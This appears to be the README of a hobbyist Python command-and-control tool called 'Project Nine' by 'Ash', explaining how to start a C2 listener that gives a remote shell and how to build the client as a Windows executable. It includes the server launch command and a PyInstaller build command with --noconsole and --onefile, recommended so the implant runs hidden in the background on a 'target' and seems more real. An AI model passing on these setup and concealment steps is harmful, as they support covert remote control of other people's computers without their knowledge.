   ___             _         __    ___  _         
  / _ \_______    (_)__ ____/ /_  / _ \(_)__  ___ 
 / ___/ __/ _ \  / / -_) __/ __/  \_, / / _ \/ -_)
/_/  /_/  \___/_/ /\__/\__/\__/  /___/_/_//_/\__/ 
             |___/       


# c2 script made by Ash
This script is designed to start a c2 server(command and control)
When connected a shell will spawn allowing remote control to the computer. Ill be guiding you on how to set this up.
# Use the arguments ex: python3 c2.py --lhost 192.168.1.15 --log test.html
This will start a server with the lhost of 192.168.1.15 and the default port(6000) and log everything in a neat html file.
# Premade c2exe file.
This is coded for you already! Change the ip and port and build it using pyinstaller.(pip3 install pyinstaller)
If your target is on windows you have to build the app on windows. You can use a vm
ex: python3 -m PyInstaller --onefile --noconsole --icon(optional) c2exe.py
make sure to include onefile and noconsole this will execute the script in the background making it more real.
